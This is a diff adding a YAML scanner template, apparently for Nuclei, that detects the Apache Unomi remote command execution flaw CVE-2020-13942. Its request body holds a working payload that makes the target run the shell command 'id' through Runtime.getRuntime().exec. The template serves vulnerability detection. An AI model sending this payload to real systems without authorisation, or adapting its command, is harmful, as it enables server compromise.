@@ -1,0 +1,45 @@
+id: apache-unomi-context-json-rce
+info:
+  name: Apache Unomi Remote Command Execution Vulnerability (CVE-2020-13942)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,cve,CVE-2020-13942
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/context.json"
+    headers:
+      Content-Type: application/json
+    body: |-
+      {
+      "filters": [
+      {
+      "id": "zyljs",
+      "filters": [
+        {
+          "condition": {
+            "parameterValues": {
+              "abcd": "script::Runtime.getRuntime().exec('id')"
+            },
+            "type": "profilePropertyCondition"
+          }
+        }
+      ]
+      }
+      ],
+      "sessionId": "abcd"
+      }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "context-profile-id"
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "profileId"
